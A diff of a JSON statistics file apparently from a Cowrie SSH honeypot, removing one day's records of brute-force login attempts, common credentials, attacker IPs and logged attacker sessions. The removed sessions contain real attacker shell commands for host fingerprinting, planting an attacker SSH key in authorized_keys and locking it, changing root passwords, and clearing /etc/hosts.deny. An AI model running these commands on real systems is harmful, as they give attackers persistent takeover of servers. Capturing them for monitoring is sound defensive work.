@@ -1,915 +1,49 @@
 {
-  "last_updated": "2026-07-06T06:30:01.190366+00:00",
-  "last_updated_local": "2026-07-05 23:30:01 PDT",
+  "last_updated": "2026-07-06T07:00:01.904894+00:00",
+  "last_updated_local": "2026-07-06 00:00:01 PDT",
   "cowrie": {
-    "total_connections": 3512,
-    "total_login_attempts": 3022,
-    "successful_logins": 78,
-    "unique_ips": 224,
-    "top_usernames": [
-      [
-        "root",
-        1180
-      ],
-      [
-        "admin",
-        233
-      ],
-      [
-        "ubuntu",
-        102
-      ],
-      [
-        "user",
-        82
-      ],
-      [
-        "test",
-        59
-      ],
-      [
-        "guest",
-        32
-      ],
-      [
-        "administrator",
-        31
-      ],
-      [
-        "deploy",
-        31
-      ],
-      [
-        "git",
-        29
-      ],
-      [
-        "debian",
-        28
-      ]
-    ],
-    "top_passwords": [
-      [
-        "123456",
-        190
-      ],
-      [
-        "admin",
-        130
-      ],
-      [
-        "password",
-        100
-      ],
-      [
-        "1234",
-        70
-      ],
-      [
-        "12345678",
-        68
-      ],
-      [
-        "123456789",
-        66
-      ],
-      [
-        "123",
-        62
-      ],
-      [
-        "12345",
-        59
-      ],
-      [
-        "qwerty",
-        53
-      ],
-      [
-        "root",
-        45
-      ]
-    ],
+    "total_connections": 1,
+    "total_login_attempts": 0,
+    "successful_logins": 0,
+    "unique_ips": 1,
+    "top_usernames": [],
+    "top_passwords": [],
     "top_ips": [
       [
-        "91.92.40.37",
-        782
-      ],
-      [
-        "139.99.74.35",
-        360
-      ],
-      [
         "45.156.87.13",
-        359
-      ],
-      [
-        "91.92.40.237",
-        273
-      ],
-      [
-        "91.92.40.7",
-        151
-      ],
-      [
-        "2.57.122.168",
-        122
-      ],
-      [
-        "92.118.39.71",
-        80
-      ],
-      [
-        "92.118.39.49",
-        71
-      ],
-      [
-        "176.53.159.196",
-        68
-      ],
-      [
-        "14.63.196.175",
-        44
+        1
       ]
     ],
-    "attacker_sessions": [
-      {
-        "ip": "92.118.39.49",
-        "username": "root",
-        "password": "111111",
-        "time": "03:02:40",
-        "commands": [
-          "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '\"' ) || echo \"\"); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox uname -m 2>/dev/null || ( [ -f /proc/cpuinfo ] && grep -q \"lm\" /proc/cpuinfo && echo x86_64 ) || ( [ -f /proc/cpuinfo ] && grep -q \"CPU architecture: 8\" /proc/cpuinfo && echo aarch64 ) || ( [ -f /proc/cpuinfo ] && grep -q \"CPU architecture: 7\" /proc/cpuinfo && echo armv7l ) || echo \"\"); uptime=$(cat /proc/uptime 2>/dev/null || busybox cat /proc/uptime 2>/dev/null); cpus=$(nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || busybox nproc 2>/dev/null || grep -c \"^processor\" /proc/cpuinfo 2>/dev/null); cpu_model=$( { lscpu 2>/dev/null | awk -F: '/Model name/ {print $2}'; grep -m1 -E \"^model name\" /proc/cpuinfo 2>/dev/null | cut -d: -f2-; grep -m1 -E \"^Hardware\" /proc/cpuinfo 2>/dev/null | cut -d: -f2-; cat /proc/device-tree/model 2>/dev/null; } | sed '/^$/d; /unknown/d; s/^[[:space:]]*//; s/[[:space:]]*$//; s/ AArch64 Processor$//; s/ Processor$//; s/ CPU$//' | head -1 ); gpu_info=$( (lspci 2>/dev/null | grep -i vga; lspci 2>/dev/null | grep -i nvidia; busybox lspci 2>/dev/null | grep -i vga; busybox lspci 2>/dev/null | grep -i nvidia) 2>/dev/null ); last_output=$(last 2>/dev/null); filter_output=$( ( export LANG=C LC_ALL=C; echo '===SHELL_BEHAVIOR==='; printf 'path_err='; ( ./xxxxxx 2>&1 || true ) | head -c 250; printf '\\n'; printf 'cmd_err='; ( xxxxxx 2>&1 || true ) | head -c 250; printf '\\n'; echo '===DONE===' ) 2>&1 ); echo \"UNAME:$uname\"; echo \"ARCH:$arch\"; echo \"UPTIME:$uptime\"; echo \"CPUS:$cpus\"; echo \"CPU_MODEL:$cpu_model\"; echo \"GPU:$gpu_info\"; echo \"LAST:$last_output\"; echo \"FILTER:$filter_output\"",
-          "uname -s -v -n -m 2 > /dev/null || /bin/uname -s -v -n -m 2 > /dev/null || /usr/bin/uname -s -v -n -m 2 > /dev/null || busybox uname -s -v -n -m 2 > /dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d  -f1 "
-        ]
-      },
-      {
-        "ip": "92.118.39.49",
-        "username": "root",
-        "password": "admin",
-        "time": "03:21:46",
-        "commands": [
-          "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '\"' ) || echo \"\"); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox uname -m 2>/dev/null || ( [ -f /proc/cpuinfo ] && grep -q \"lm\" /proc/cpuinfo && echo x86_64 ) || ( [ -f /proc/cpuinfo ] && grep -q \"CPU architecture: 8\" /proc/cpuinfo && echo aarch64 ) || ( [ -f /proc/cpuinfo ] && grep -q \"CPU architecture: 7\" /proc/cpuinfo && echo armv7l ) || echo \"\"); uptime=$(cat /proc/uptime 2>/dev/null || busybox cat /proc/uptime 2>/dev/null); cpus=$(nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || busybox nproc 2>/dev/null || grep -c \"^processor\" /proc/cpuinfo 2>/dev/null); cpu_model=$( { lscpu 2>/dev/null | awk -F: '/Model name/ {print $2}'; grep -m1 -E \"^model name\" /proc/cpuinfo 2>/dev/null | cut -d: -f2-; grep -m1 -E \"^Hardware\" /proc/cpuinfo 2>/dev/null | cut -d: -f2-; cat /proc/device-tree/model 2>/dev/null; } | sed '/^$/d; /unknown/d; s/^[[:space:]]*//; s/[[:space:]]*$//; s/ AArch64 Processor$//; s/ Processor$//; s/ CPU$//' | head -1 ); gpu_info=$( (lspci 2>/dev/null | grep -i vga; lspci 2>/dev/null | grep -i nvidia; busybox lspci 2>/dev/null | grep -i vga; busybox lspci 2>/dev/null | grep -i nvidia) 2>/dev/null ); last_output=$(last 2>/dev/null); filter_output=$( ( export LANG=C LC_ALL=C; echo '===SHELL_BEHAVIOR==='; printf 'path_err='; ( ./xxxxxx 2>&1 || true ) | head -c 250; printf '\\n'; printf 'cmd_err='; ( xxxxxx 2>&1 || true ) | head -c 250; printf '\\n'; echo '===DONE===' ) 2>&1 ); echo \"UNAME:$uname\"; echo \"ARCH:$arch\"; echo \"UPTIME:$uptime\"; echo \"CPUS:$cpus\"; echo \"CPU_MODEL:$cpu_model\"; echo \"GPU:$gpu_info\"; echo \"LAST:$last_output\"; echo \"FILTER:$filter_output\"",
-          "uname -s -v -n -m 2 > /dev/null || /bin/uname -s -v -n -m 2 > /dev/null || /usr/bin/uname -s -v -n -m 2 > /dev/null || busybox uname -s -v -n -m 2 > /dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d  -f1 "
-        ]
-      },
-      {
-        "ip": "101.52.130.122",
-        "username": "root1",
-        "password": "12345678",
-        "time": "05:09:53",
-        "commands": [
-          "cd ~; chattr -ia .ssh; lockr -ia .ssh",
-          "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
-          "cat /proc/cpuinfo | grep name | wc -l",
-          "echo \"root:G9HrKFWMW45L\"|chpasswd|bash",
-          "rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;",
-          "cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",
-          "free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",
-          "ls -lh $(which ls)",
-          "which ls",
-          "crontab -l"
-        ]
-      },
-      {
-        "ip": "92.118.39.14",
-        "username": "root",
-        "password": "111111",
-        "time": "05:15:10",
-        "commands": [
-          "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '\"' ) || echo \"\"); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox uname -m 2>/dev/null || ( [ -f /proc/cpuinfo ] && grep -q \"lm\" /proc/cpuinfo && echo x86_64 ) || ( [ -f /proc/cpuinfo ] && grep -q \"CPU architecture: 8\" /proc/cpuinfo && echo aarch64 ) || ( [ -f /proc/cpuinfo ] && grep -q \"CPU architecture: 7\" /proc/cpuinfo && echo armv7l ) || echo \"\"); uptime=$(cat /proc/uptime 2>/dev/null || busybox cat /proc/uptime 2>/dev/null); cpus=$(nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || busybox nproc 2>/dev/null || grep -c \"^processor\" /proc/cpuinfo 2>/dev/null); cpu_model=$( { lscpu 2>/dev/null | awk -F: '/Model name/ {print $2}'; grep -m1 -E \"^model name\" /proc/cpuinfo 2>/dev/null | cut -d: -f2-; grep -m1 -E \"^Hardware\" /proc/cpuinfo 2>/dev/null | cut -d: -f2-; cat /proc/device-tree/model 2>/dev/null; } | sed '/^$/d; /unknown/d; s/^[[:space:]]*//; s/[[:space:]]*$//; s/ AArch64 Processor$//; s/ Processor$//; s/ CPU$//' | head -1 ); gpu_info=$( (lspci 2>/dev/null | grep -i vga; lspci 2>/dev/null | grep -i nvidia; busybox lspci 2>/dev/null | grep -i vga; busybox lspci 2>/dev/null | grep -i nvidia) 2>/dev/null ); last_output=$(last 2>/dev/null); filter_output=$( ( export LANG=C LC_ALL=C; echo '===SHELL_BEHAVIOR==='; printf 'path_err='; ( ./xxxxxx 2>&1 || true ) | head -c 250; printf '\\n'; printf 'cmd_err='; ( xxxxxx 2>&1 || true ) | head -c 250; printf '\\n'; echo '===DONE===' ) 2>&1 ); echo \"UNAME:$uname\"; echo \"ARCH:$arch\"; echo \"UPTIME:$uptime\"; echo \"CPUS:$cpus\"; echo \"CPU_MODEL:$cpu_model\"; echo \"GPU:$gpu_info\"; echo \"LAST:$last_output\"; echo \"FILTER:$filter_output\"",
-          "uname -s -v -n -m 2 > /dev/null || /bin/uname -s -v -n -m 2 > /dev/null || /usr/bin/uname -s -v -n -m 2 > /dev/null || busybox uname -s -v -n -m 2 > /dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d  -f1 "
-        ]
-      },
-      {
-        "ip": "42.96.20.16",
-        "username": "root1",
-        "password": "12345678",
-        "time": "05:27:42",
-        "commands": [
-          "cd ~; chattr -ia .ssh; lockr -ia .ssh",
-          "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
-          "cat /proc/cpuinfo | grep name | wc -l",
-          "echo \"root:OdMa07kp8aCT\"|chpasswd|bash",
-          "rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;",
-          "cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",
-          "free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",
-          "ls -lh $(which ls)",
-          "which ls",
-          "crontab -l"
-        ]
-      },
-      {
-        "ip": "101.126.22.12",
-        "username": "root1",
-        "password": "12345678",
-        "time": "05:30:25",
-        "commands": [
-          "cd ~; chattr -ia .ssh; lockr -ia .ssh",
-          "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
-          "cat /proc/cpuinfo | grep name | wc -l",
-          "echo \"root:h6HxG14KaXAx\"|chpasswd|bash",
-          "rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;",
-          "cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",
-          "free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",
-          "ls -lh $(which ls)",
-          "which ls",
-          "crontab -l"
-        ]
-      },
-      {
-        "ip": "14.63.196.175",
-        "username": "root1",
-        "password": "12345678",
-        "time": "05:57:31",
-        "commands": [
-          "cd ~; chattr -ia .ssh; lockr -ia .ssh",
-          "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
-          "cat /proc/cpuinfo | grep name | wc -l",
-          "echo \"root:r8fegehkNiIX\"|chpasswd|bash",
-          "rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;",
-          "cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",
-          "free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",
-          "ls -lh $(which ls)",
-          "which ls",
-          "crontab -l"
-        ]
-      },
-      {
-        "ip": "122.166.49.42",
-        "username": "root1",
-        "password": "12345678",
-        "time": "06:05:42",
-        "commands": [
-          "cd ~; chattr -ia .ssh; lockr -ia .ssh",
-          "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
-          "cat /proc/cpuinfo | grep name | wc -l",
-          "echo \"root:Hq4aYciJnbKq\"|chpasswd|bash",
-          "rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;",
-          "cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",
-          "free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",
-          "ls -lh $(which ls)",
-          "which ls",
-          "crontab -l"
-        ]
-      },
-      {
-        "ip": "14.63.196.175",
-        "username": "root1",
-        "password": "12345678",
-        "time": "06:15:16",
-        "commands": [
-          "cd ~; chattr -ia .ssh; lockr -ia .ssh",
-          "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
-          "cat /proc/cpuinfo | grep name | wc -l",
-          "echo \"root:zoeClI4L7VAv\"|chpasswd|bash",
-          "rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;",
-          "cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",
-          "free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",
-          "ls -lh $(which ls)",
-          "which ls",
-          "crontab -l"
-        ]
-      },
-      {
-        "ip": "195.178.110.232",
-        "username": "root",
-        "password": "111111",
-        "time": "06:59:30",
-        "commands": [
-          "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '\"' ) || echo \"\"); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox uname -m 2>/dev/null || ( [ -f /proc/cpuinfo ] && grep -q \"lm\" /proc/cpuinfo && echo x86_64 ) || ( [ -f /proc/cpuinfo ] && grep -q \"CPU architecture: 8\" /proc/cpuinfo && echo aarch64 ) || ( [ -f /proc/cpuinfo ] && grep -q \"CPU architecture: 7\" /proc/cpuinfo && echo armv7l ) || echo \"\"); uptime=$(cat /proc/uptime 2>/dev/null || busybox cat /proc/uptime 2>/dev/null); cpus=$(nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || busybox nproc 2>/dev/null || grep -c \"^processor\" /proc/cpuinfo 2>/dev/null); cpu_model=$( { lscpu 2>/dev/null | awk -F: '/Model name/ {print $2}'; grep -m1 -E \"^model name\" /proc/cpuinfo 2>/dev/null | cut -d: -f2-; grep -m1 -E \"^Hardware\" /proc/cpuinfo 2>/dev/null | cut -d: -f2-; cat /proc/device-tree/model 2>/dev/null; } | sed '/^$/d; /unknown/d; s/^[[:space:]]*//; s/[[:space:]]*$//; s/ AArch64 Processor$//; s/ Processor$//; s/ CPU$//' | head -1 ); gpu_info=$( (lspci 2>/dev/null | grep -i vga; lspci 2>/dev/null | grep -i nvidia; busybox lspci 2>/dev/null | grep -i vga; busybox lspci 2>/dev/null | grep -i nvidia) 2>/dev/null ); last_output=$(last 2>/dev/null); filter_output=$( ( export LANG=C LC_ALL=C; echo '===SHELL_BEHAVIOR==='; printf 'path_err='; ( ./xxxxxx 2>&1 || true ) | head -c 250; printf '\\n'; printf 'cmd_err='; ( xxxxxx 2>&1 || true ) | head -c 250; printf '\\n'; echo '===DONE===' ) 2>&1 ); echo \"UNAME:$uname\"; echo \"ARCH:$arch\"; echo \"UPTIME:$uptime\"; echo \"CPUS:$cpus\"; echo \"CPU_MODEL:$cpu_model\"; echo \"GPU:$gpu_info\"; echo \"LAST:$last_output\"; echo \"FILTER:$filter_output\"",
-          "uname -s -v -n -m 2 > /dev/null || /bin/uname -s -v -n -m 2 > /dev/null || /usr/bin/uname -s -v -n -m 2 > /dev/null || busybox uname -s -v -n -m 2 > /dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d  -f1 "
-        ]
-      },
-      {
-        "ip": "195.178.110.232",
-        "username": "root",
-        "password": "admin",
-        "time": "07:13:26",
-        "commands": [
-          "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '\"' ) || echo \"\"); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox uname -m 2>/dev/null || ( [ -f /proc/cpuinfo ] && grep -q \"lm\" /proc/cpuinfo && echo x86_64 ) || ( [ -f /proc/cpuinfo ] && grep -q \"CPU architecture: 8\" /proc/cpuinfo && echo aarch64 ) || ( [ -f /proc/cpuinfo ] && grep -q \"CPU architecture: 7\" /proc/cpuinfo && echo armv7l ) || echo \"\"); uptime=$(cat /proc/uptime 2>/dev/null || busybox cat /proc/uptime 2>/dev/null); cpus=$(nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || busybox nproc 2>/dev/null || grep -c \"^processor\" /proc/cpuinfo 2>/dev/null); cpu_model=$( { lscpu 2>/dev/null | awk -F: '/Model name/ {print $2}'; grep -m1 -E \"^model name\" /proc/cpuinfo 2>/dev/null | cut -d: -f2-; grep -m1 -E \"^Hardware\" /proc/cpuinfo 2>/dev/null | cut -d: -f2-; cat /proc/device-tree/model 2>/dev/null; } | sed '/^$/d; /unknown/d; s/^[[:space:]]*//; s/[[:space:]]*$//; s/ AArch64 Processor$//; s/ Processor$//; s/ CPU$//' | head -1 ); gpu_info=$( (lspci 2>/dev/null | grep -i vga; lspci 2>/dev/null | grep -i nvidia; busybox lspci 2>/dev/null | grep -i vga; busybox lspci 2>/dev/null | grep -i nvidia) 2>/dev/null ); last_output=$(last 2>/dev/null); filter_output=$( ( export LANG=C LC_ALL=C; echo '===SHELL_BEHAVIOR==='; printf 'path_err='; ( ./xxxxxx 2>&1 || true ) | head -c 250; printf '\\n'; printf 'cmd_err='; ( xxxxxx 2>&1 || true ) | head -c 250; printf '\\n'; echo '===DONE===' ) 2>&1 ); echo \"UNAME:$uname\"; echo \"ARCH:$arch\"; echo \"UPTIME:$uptime\"; echo \"CPUS:$cpus\"; echo \"CPU_MODEL:$cpu_model\"; echo \"GPU:$gpu_info\"; echo \"LAST:$last_output\"; echo \"FILTER:$filter_output\"",
-          "uname -s -v -n -m 2 > /dev/null || /bin/uname -s -v -n -m 2 > /dev/null || /usr/bin/uname -s -v -n -m 2 > /dev/null || busybox uname -s -v -n -m 2 > /dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d  -f1 "
-        ]
-      },
-      {
-        "ip": "35.187.231.181",
-        "username": "root",
-        "password": "",
-        "time": "07:32:43",
-        "commands": [
-          "echo SHELL_TEST"
-        ]
-      },
-      {
-        "ip": "35.187.231.181",
-        "username": "root",
-        "password": "admin",
-        "time": "07:33:27",
-        "commands": [
-          "echo SHELL_TEST"
-        ]
-      },
-      {
-        "ip": "171.244.63.18",
-        "username": "admin",
-        "password": "password1234",
-        "time": "07:50:51",
-        "commands": [
-          "cd ~; chattr -ia .ssh; lockr -ia .ssh",
-          "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
-          "cat /proc/cpuinfo | grep name | wc -l",
-          "echo -e \"password1234\\nccSANw5ROoKj\\nccSANw5ROoKj\"|passwd|bash",
-          "Enter new UNIX password: ",
-          "echo \"password1234\\nccSANw5ROoKj\\nccSANw5ROoKj\\n\"|passwd",
-          "cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",
-          "free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",
-          "ls -lh $(which ls)",
-          "which ls"
-        ]
-      },
-      {
-        "ip": "91.92.40.37",
-        "username": "ana",
-        "password": "ana",
-        "time": "11:14:13",
-        "commands": [
-          "uname -s -v -n -r -m"
-        ]
-      },
-      {
-        "ip": "130.12.180.51",
-        "username": "root",
-        "password": "root",
-        "time": "13:41:10",
-        "commands": [
-          "chmod +x clean.sh; sh clean.sh; rm -rf clean.sh; chmod +x setup.sh; sh setup.sh; rm -rf setup.sh; mkdir -p ~/.ssh; chattr -ia ~/.ssh/authorized_keys; echo \"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCqHrvnL6l7rT/mt1AdgdY9tC1GPK216q0q/7neNVqm7AgvfJIM3ZKniGC3S5x6KOEApk+83GM4IKjCPfq007SvT07qh9AscVxegv66I5yuZTEaDAG6cPXxg3/0oXHTOTvxelgbRrMzfU5SEDAEi8+ByKMefE+pDVALgSTBYhol96hu1GthAMtPAFahqxrvaRR4nL4ijxOsmSLREoAb1lxiX7yvoYLT45/1c5dJdrJrQ60uKyieQ6FieWpO2xF6tzfdmHbiVdSmdw0BiCRwe+fuknZYQxIC1owAj2p5bc+nzVTi3mtBEk9rGpgBnJ1hcEUslEf/zevIcX8+6H7kUMRr rsa-key-20230629\" > ~/.ssh/authorized_keys; chattr +ai ~/.ssh/authorized_keys; uname -a; echo -e \"\\x61\\x75\\x74\\x68\\x5F\\x6F\\x6B\\x0A\"; "
-        ]
-      },
-      {
-        "ip": "91.92.40.237",
-        "username": "ftp",
-        "password": "ftp",
-        "time": "14:14:32",
-        "commands": [
